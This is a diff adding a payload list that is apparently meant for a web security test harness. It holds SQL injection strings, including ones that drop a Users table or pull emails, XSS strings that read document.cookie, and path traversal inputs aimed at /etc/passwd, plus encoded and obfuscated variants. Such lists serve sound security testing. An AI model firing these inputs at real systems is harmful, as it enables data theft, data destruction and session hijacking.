@@ -1,0 +1,40 @@
+# SQL injection
+SQLi|' OR 1=1--
+SQLi|' OR '1'='1
+SQLi|admin'--
+SQLi|1' UNION SELECT NULL,NULL--
+SQLi|x' UNION SELECT id,email FROM Users--
+SQLi|" OR 1=1--
+SQLi|1 OR 1=1
+SQLi|') OR ('1'='1
+SQLi|'; DROP TABLE Users;--
+SQLi|1' AND SLEEP(5)--
+SQLi|' OR 'a'='a
+SQLi|admin' #
+# Cross-site scripting
+XSS|<script>alert(1)</script>
+XSS|<img src=x onerror=alert(1)>
+XSS|<svg onload=alert(1)>
+XSS|<a href="javascript:alert(1)">x</a>
+XSS|<iframe src="javascript:alert(1)">
+XSS|<body onfocus=alert(1) autofocus>
+XSS|<img src=x onmouseover=alert(1)>
+XSS|<ScRiPt>alert(1)</sCrIpT>
+XSS|<input autofocus onfocus=alert(1)>
+XSS|"><script>alert(document.cookie)</script>
+# Path traversal
+PathTraversal|../../etc/passwd
+PathTraversal|..\..\windows\win.ini
+PathTraversal|....//....//etc/passwd
+PathTraversal|%2e%2e%2f%2e%2e%2fetc%2fpasswd
+PathTraversal|/etc/passwd
+PathTraversal|..%c0%af..%c0%afetc/passwd
+# Already-encoded payloads (the harness encodes them once more, so they arrive double-encoded)
+DoubleEncoded|%27%20OR%201%3D1--
+DoubleEncoded|%27%20OR%201%3D1
+DoubleEncoded|%3Cscript%3Ealert(1)%3C%2Fscript%3E
+DoubleEncoded|%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+# Obfuscation tricks
+Obfuscation|<scr%00ipt>alert(1)</script>
+Obfuscation|1 UNION/**/SELECT 1,2
+Obfuscation|1 oR 2=2
